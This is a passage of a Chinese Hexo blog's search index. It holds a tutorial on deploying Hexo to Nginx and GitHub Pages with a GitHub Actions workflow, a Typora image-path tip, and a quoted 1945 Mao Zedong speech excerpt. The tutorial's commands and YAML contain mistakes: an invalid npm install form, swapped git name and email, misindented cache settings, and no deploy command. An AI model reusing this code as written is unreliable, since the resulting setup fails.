</p><p>进入创建好的 Blog 文件夹，右击选择 <code>Git Bash here</code> 打开命令窗口，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装Hexo</span><br>npm install -g hexo-cli<br><span class="hljs-comment"># 检查安装是否成功</span><br>hexo -v<br><span class="hljs-comment"># 初始化hexo文件夹</span><br>hexo init blog<br><span class="hljs-built_in">cd</span> blog<br><span class="hljs-comment"># 新建一个文章</span><br>hexo new test_blog<br><span class="hljs-comment"># 生成静态页面</span><br>hexo g<br><span class="hljs-comment"># 启动服务器，本地预览 localhost:4000</span><br>hexo s<br></code></pre></td></tr></table></figure><h2 id="Hexo-主题安装"><a href="#Hexo-主题安装" class="headerlink" title="Hexo 主题安装"></a>Hexo 主题安装</h2><p>参考 <code>Hexo Fluid</code> 官方手册：<a href="https://hexo.fluid-dev.com/docs">Hexo Fluid 用户手册</a></p><h2 id="Hexo-部署至-Nginx"><a href="#Hexo-部署至-Nginx" class="headerlink" title="Hexo 部署至 Nginx"></a>Hexo 部署至 Nginx</h2><p>在<code>Hexo</code> 项目目录下，执行以下命令打包 <code>Hexo</code> ，生成 <code>public</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo g<br></code></pre></td></tr></table></figure><p>将<code>public</code> 目录下的文件放至 nginx 的<code>html</code> 目录，启动 nginx 即可</p><h2 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h2><p>GitHub 主页右上角加号 -&gt; New repository ：</p><ul><li>Repository name 中输入 <code>账号名.github.io</code></li><li>勾选 “Initialize this repository with a README”</li></ul><p>创建仓库后，默认自动启用HTTPS，访问地址为 <code>https://账号名.github.io</code> </p><h3 id="部署-Hexo-到-Github-Pages"><a href="#部署-Hexo-到-Github-Pages" class="headerlink" title="部署 Hexo 到 Github Pages"></a>部署 Hexo 到 Github Pages</h3><p>在 Blog 文件目录下，输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装 hexo-deployer-git</span><br>npm run install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>安装完成后，修改同目录下<code>_config.yml</code>文件末尾部分</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository:</span> <span class="hljs-string">git@github.com:账户名/账户名.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><p>完成后，运行以下命令，将Hexo部署到Github Pages，通过域名 <code>https://账号名.github.io</code> 可查看博客网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo deploy<br></code></pre></td></tr></table></figure><h3 id="Github-Action-实现自动化部署-Hexo"><a href="#Github-Action-实现自动化部署-Hexo" class="headerlink" title="Github Action 实现自动化部署 Hexo"></a>Github Action 实现自动化部署 Hexo</h3><blockquote><ol><li>配置部署公钥</li></ol></blockquote><p>利用 <code>ssh-keygen</code> 生成公私钥</p><ul><li>Github Pages 仓库  <code>Settings -&gt; Secrets -&gt; Actions</code> ， 新建一个 <code>HEXO_DEPLOY_PRIVATE_KEY</code> 存放私钥</li></ul><p><img src="/../blog-assets/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1654593294036.png" alt="1654593294036"></p><ul><li>Pages 仓库  <code>Settings -&gt; Deploy keys</code> ，新建一个 <code>HEXO_DEPLOY_PUB_KEY</code> 存放公钥</li></ul><p><img src="/../blog-assets/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1654593824300.png" alt="1654593824300"></p><blockquote><ol start="2"><li>编写 Action</li></ol></blockquote><p> 在 <code>.github/workflows</code> 新建 <code>deploy.yml</code> 文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CI</span><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">dev-dunkingcurry</span><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">strategy:</span><br>      <span class="hljs-attr">matrix:</span><br>        <span class="hljs-attr">node_version:</span> [<span class="hljs-number">14.</span><span class="hljs-string">x</span>]<br><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">source</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">ref:</span> <span class="hljs-string">dev-dunkingcurry</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Use</span> <span class="hljs-string">Node.js</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node_version</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">version:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node_version</span> <span class="hljs-string">&#125;&#125;</span><br><br>      <span class="hljs-comment"># 缓存node_modules，避免每次跑action都要重新下载</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Cache</span> <span class="hljs-string">node</span> <span class="hljs-string">modules</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/cache@v1</span>    <br>        <span class="hljs-attr">id:</span> <span class="hljs-string">cache</span>    <br>        <span class="hljs-attr">with:</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">node_modules</span><br>        <span class="hljs-attr">key:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">runner.os</span> <span class="hljs-string">&#125;&#125;-node-$&#123;&#123;</span> <span class="hljs-string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">restore-keys:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          $&#123;&#123; runner.os &#125;&#125;-node-</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">hexo</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">ACTION_DEPLOY_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.HEXO_DEPLOY_PRIVATE_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          mkdir -p ~/.ssh/</span><br><span class="hljs-string">          echo &quot;$ACTION_DEPLOY_KEY&quot; &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">          chmod 600 ~/.ssh/id_rsa</span><br><span class="hljs-string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string">          git config --global user.email &quot;DunkingCurry30&quot;</span><br><span class="hljs-string">          git config --global user.name &quot;123456789@qq.com&quot;</span><br><span class="hljs-string">          npm install hexo-cli -g</span><br><span class="hljs-string">          npm install</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Hexo</span> <span class="hljs-string">deploy</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo g</span><br></code></pre></td></tr></table></figure><blockquote><ol start="3"><li>push 至 Pages 仓库</li></ol></blockquote><p>push 至 Pages 仓库后，在 仓库 <code>Action</code> 界面下查看自动化流水线</p><p><img src="/../blog-assets/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1654596600222.png" alt="1654596600222"></p><p>点击可查看每个步骤的执行信息</p><p><img src="/../blog-assets/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1654596296439.png" alt="1654596296439"></p><blockquote><ol start="4"><li>验证自动化部署结果</li></ol></blockquote><p>流水线显示执行成功后，通过域名 <code>https://账号名.github.io</code> 可查看博客网站内容，更新成功</p><p><img src="/../blog-assets/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1654584003746.png" alt="1654584003746"></p><p><strong>至此，大功告成！</strong></p><blockquote><p>Hexo 提交代码同时部署至 <code>云服务器</code> 和 <code>Github Pages</code> 可参考该篇文章： <a href="/2022/06/07/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/">docker 部署 gitlab gitlab-runner 实现 CI</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web前端</category>
      
      <category>博客 Blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gitlab</tag>
      
      <tag>git</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown 常见问题解决</title>
    <link href="/2022/06/02/Markdown%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/06/02/Markdown%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<ul><li>前置条件： <code>Typora</code> 编辑器</li></ul><h1 id="Markdown-图片无法正常显示"><a href="#Markdown-图片无法正常显示" class="headerlink" title="Markdown 图片无法正常显示"></a>Markdown 图片无法正常显示</h1><blockquote><p>Q：<strong>本地编辑markdown图片插入正常，<code>.md</code> 文件迁移后，图片无法显示</strong> ？</p><p>A：<code>Markdown</code> 默认插入图片为<code>绝对路径</code> ，使用相对路径插入，在<code>.md</code>文件迁移后将对应的图片目录一并打包进行迁移，图片显示正常</p></blockquote><h3 id="Typora-插入图片设置相对路径"><a href="#Typora-插入图片设置相对路径" class="headerlink" title="Typora 插入图片设置相对路径"></a>Typora 插入图片设置相对路径</h3><p>打开 Typora <code>文件—偏好设置—图像</code> </p><p><img src="/../blog-assets/Markdown%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/1654585705573.png" alt="1654585705573"><br>按上图进行勾选，其中路径可以自定义设置相对路径，举例说明，现需在 <code>helloword.md</code> 中插入图片<code>1.jpg</code> ，相对路径设置为 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./<span class="hljs-variable">$&#123;filename&#125;</span><br></code></pre></td></tr></table></figure><p>则<code>1.jpg</code> 会被复制到 <code>helloworld.md</code> 的同级目录的 <code>helloword</code> 文件夹下</p><ul><li>文件迁移时，同时迁移 <code>helloworld.md</code> 及 <code>helloworld</code> 文件夹，切不改变目录层级结构时，图片显示正常</li><li>此方法对本地图片复制，或者网络链接图片，截图均可生效</li></ul>]]></content>
    
    
    <categories>
      
      <category>常用工具技巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前途是光明的，道路是曲折的</title>
    <link href="/2019/11/01/%E5%89%8D%E9%80%94%E6%98%AF%E5%85%89%E6%98%8E%E7%9A%84/"/>
    <url>/2019/11/01/%E5%89%8D%E9%80%94%E6%98%AF%E5%85%89%E6%98%8E%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文节选自毛泽东从重庆回到延安以后，在延安干部会上的报告<strong>《关于重庆谈判》</strong>（一九四五年十月十七日）。 </p></blockquote><p>我们中国也处在急剧的变动中间。中国发展的总趋势，也必定要变好，不能变坏。世界是在进步的，前途是光明的，这个历史的总趋势任何人也改变不了。</p><p>我们应当把世界进步的情况和光明的前途，常常向人民宣传，使人民建立起胜利的信心。同时，我们还要告诉人民，告诉同志们，道路是曲折的。在革命的道路上还有许多障碍物，还有许多困难。</p><p>我们党的七次代表大会设想过许多困难，我们宁肯把困难想得更多一些。有些同志不愿意多想困难。但是困难是事实，有多少就得承认多少，不能采取“不承认主义”。</p><p>我们要承认困难，分析困难，向困难作斗争。世界上没有直路，要准备走曲折的路，不要贪便宜。不能设想，哪一天早上，一切反动派会统统自己跪在地下。</p><p>总之，<strong>前途是光明的，道路是曲折的</strong>。我们面前困难还多，不可忽视。我们和全体人民团结起来，共同努力，一定能够排除万难，达到胜利的目的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
